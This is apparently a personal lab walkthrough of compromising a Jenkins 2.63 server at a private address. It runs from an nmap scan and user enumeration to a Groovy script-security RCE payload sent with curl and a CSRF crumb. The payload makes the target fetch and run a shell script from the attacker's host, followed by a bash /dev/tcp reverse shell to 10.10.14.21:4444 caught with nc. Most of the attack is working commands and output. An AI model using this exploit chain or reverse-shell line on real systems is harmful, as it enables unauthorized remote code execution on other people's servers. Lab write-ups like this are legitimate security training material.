## NMAP
```
 nmap -sCV -p- -A -T4 10.10.110.102
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-13 21:18 PDT
Nmap scan report for 10.10.110.102
Host is up (0.079s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Dashboard [Jenkins]
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 235.84 seconds


```

Jenkins site on port 8080
```
Jenkins ver. 2.63
```

Testing for RCE 
```
curl -k -4 -s http://10.10.110.102:8080/securityRealm/user/admin/search/index\?q\=a
```
```
<!DOCTYPE html><html><head resURL="/static/e31c8471" data-rooturl="" data-resurl="/static/e31c8471">
    

    <title>Search for 'a' [Jenkins]</title><link rel="stylesheet" href="/static/e31c8471/css/layout-common.css" type="text/css" /><link rel="stylesheet" href="/static/e31c8471/css/style.css" type="text/css" /><link rel="stylesheet" href="/static/e31c8471/css/color.css" type="text/css" /><link rel="stylesheet" href="/static/e31c8471/css/responsive-grid.css" type="text/css" /><link rel="shortcut icon" href="/static/e31c8471/favicon.ico" type="image/vnd.microsoft.icon" /><link color="black" rel="mask-icon" href="/images/mask-icon.svg" /><script>var isRunAsTest=false; var rootURL=""; var resURL="/static/e31c8471";</script><script src="/static/e31c8471/scripts/prototype.js" type="text/javascript"></script><script src="/static/e31c8471/scripts/behavior.js" type="text/javascript"></script><script src='/adjuncts/e31c8471/org/kohsuke/stapler/bind.js' type='text/javascript'></script><script src="/static/e31c8471/scripts/yui/yahoo/yahoo-min.js"></script><script src="/static/e31c8471/scripts/yui/dom/dom-min.js"></script><script src="/static/e31c8471/scripts/yui/event/event-min.js"></script><script src="/static/e31c8471/scripts/yui/animation/animation-min.js"></script><script src="/static/e31c8471/scripts/yui/dragdrop/dragdrop-min.js"></script><script src="/static/e31c8471/scripts/yui/container/container-min.js"></script><script src="/static/e31c8471/scripts/yui/connection/connection-min.js"></script><script src="/static/e31c8471/scripts/yui/datasource/datasource-min.js"></script><script src="/static/e31c8471/scripts/yui/autocomplete/autocomplete-min.js"></script><script src="/static/e31c8471/scripts/yui/menu/menu-min.js"></script><script src="/static/e31c8471/scripts/yui/element/element-min.js"></script><script src="/static/e31c8471/scripts/yui/button/button-min.js"></script><script src="/static/e31c8471/scripts/yui/storage/storage-min.js"></script><script src="/static/e31c8471/scripts/hudson-behavior.js" type="text/javascript"></script><script src="/static/e31c8471/scripts/sortable.js" type="text/javascript"></script><script>crumb.init("Jenkins-Crumb", "fd780767e1572b2d556aa1d50af5975a");</script><link rel="stylesheet" href="/static/e31c8471/scripts/yui/container/assets/container.css" type="text/css" /><link rel="stylesheet" href="/static/e31c8471/scripts/yui/assets/skins/sam/skin.css" type="text/css" /><link rel="stylesheet" href="/static/e31c8471/scripts/yui/container/assets/skins/sam/container.css" type="text/css" /><link rel="stylesheet" href="/static/e31c8471/scripts/yui/button/assets/skins/sam/button.css" type="text/css" /><link rel="stylesheet" href="/static/e31c8471/scripts/yui/menu/assets/skins/sam/menu.css" type="text/css" /><link rel="search" href="/opensearch.xml" type="application/opensearchdescription+xml" title="Jenkins" /><meta name="ROBOTS" content="INDEX,NOFOLLOW" /><meta name="viewport" content="width=device-width, initial-scale=1" /><script src="/static/e31c8471/jsbundles/page-init.js" type="text/javascript"></script></head><body data-model-type="hudson.search.Search" id="jenkins" class="yui-skin-sam two-column jenkins-2.63" data-version="2.63"><a href="#skip2content" class="skiplink">Skip to content</a><div id="page-head"><div id="header"><div class="logo"><a id="jenkins-home-link" href="/"><img src="/static/e31c8471/images/headshot.png" alt="title" id="jenkins-head-icon" /><img src="/static/e31c8471/images/title.png" alt="title" width="139" id="jenkins-name-icon" height="34" /></a></div><div class="login"> <a href="/login?from=%2FsecurityRealm%2Fuser%2Fadmin%2Fsearch%2Findex"><b>log in</b></a></div><div class="searchbox hidden-xs"><form method="get" name="search" action="/securityRealm/user/admin/search/" style="position:relative;" class="no-json"><div id="search-box-minWidth"></div><div id="search-box-sizer"></div><div id="searchform"><input name="q" placeholder="search" id="search-box" class="has-default-text" value="a" /> <a href="https://jenkins.io/redirect/search-box"><img src="/static/e31c8471/images/16x16/help.png" style="width: 16px; height: 16px; " class="icon-help icon-sm" /></a><div id="search-box-completion"></div><script>createSearchBox("/securityRealm/user/admin/search/");</script></div></form></div></div><div id="breadcrumbBar"><tr id="top-nav"><td id="left-top-nav" colspan="2"><link rel='stylesheet' href='/adjuncts/e31c8471/lib/layout/breadcrumbs.css' type='text/css' /><script src='/adjuncts/e31c8471/lib/layout/breadcrumbs.js' type='text/javascript'></script><div class="top-sticker noedge"><div class="top-sticker-inner"><div id="right-top-nav"><div id="right-top-nav"><div class="smallfont"><a href="?auto_refresh=true">ENABLE AUTO REFRESH</a></div></div></div><ul id="breadcrumbs"><li class="item"><a href="/" class="model-link inside">Jenkins</a></li><li href="/" class="children"></li><li class="item"><a href="/securityRealm/" class=" inside">Jenkins’ own user database</a></li><li class="separator"></li><li class="item"><a href="/securityRealm/user/admin/" class="model-link inside">admin</a></li><li class="separator"></li></ul><div id="breadcrumb-menu-target"></div></div></div></td></tr></div></div><div id="page-body" class="clear"><div id="side-panel"></div><div id="main-panel"><a name="skip2content"></a><h1>Search for 'a'</h1><ol><li id="item_admin"><a href="?q=admin">admin</a></li><li id="item_All"><a href="?q=All">All</a></li><li id="item_master"><a href="?q=master">master</a></li></ol></div></div><footer><div class="container-fluid"><div class="row"><div class="col-md-6" id="footer"></div><div class="col-md-18"><span class="page_generated">Page generated: Apr 14, 2023 4:22:22 AM UTC</span><span class="jenkins_ver"><a href="https://jenkins.io/">Jenkins ver. 2.63</a></span></div></div></div></footer></body></html>% 
    
   ```
   Because it returned data its vulnerable
   
   ```
   http://10.10.110.102:8080/securityRealm/user/admin/search/index?q=a
   ```
   Lists all users
   ```
   Search for 'a'

    admin
    All
    master
    ```
    Not sure if this is useful
    
    Looking into things its vulnerable to groovy plugin exploits
    
    https://github.com/gquere/pwn_jenkins
    
    This payload should work
    ```
    
Create the shell
```
/bin/bash -i >& /dev/tcp/10.10.14.21/4444 0>&1
```
curl http://10.10.110.102:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/ -d 'sandbox=True&value=public class x { public x (){ "curl 10.10.14.21/shell -o /tmp/shell".execute() } }'
```

```
<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<title>Error 403 No valid crumb was included in the request</title>
</head>
<body><h2>HTTP ERROR 403</h2>
<p>Problem accessing /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.. Reason:
<pre>    No valid crumb was included in the request</pre></p><hr><a href="http://eclipse.org/jetty">Powered by Jetty:// 9.4.z-SNAPSHOT</a><hr/>

</body>
</html>
curl: (6) Could not resolve host: SecureGroovyScript
```
We need a crumb

```
curl http://10.10.110.102:8080/crumbIssuer/api/json
```
{"_class":"hudson.security.csrf.DefaultCrumbIssuer","crumb":"fd780767e1572b2d556aa1d50af5975a","crumbRequestField":"Jenkins-Crumb"}%  
```
```
curl -H 'Jenkins-Crumb:fd780767e1572b2d556aa1d50af5975a' http://10.10.110.102:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/ -d 'sandbox=True&value=public class x { public x (){ "curl 10.10.14.21/shell -o /tmp/shell".execute() } }'
```
```
curl -H 'Jenkins-Crumb:fd780767e1572b2d556aa1d50af5975a' http://10.10.110.102:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/ -d 'sandbox=True&value=public class x { public x (){ "/bin/bash /tmp/shell".execute() } }'
```
Catch the RS
```
 nc -lvp 4444
listening on [any] 4444 ...
10.10.110.102: inverse host lookup failed: Unknown host
connect to [10.10.14.21] from (UNKNOWN) [10.10.110.102] 56438
bash: cannot set terminal process group (997): Inappropriate ioctl for device
bash: no job control in this shell
lucian@JENKINS01-Persephone:~$ 
```

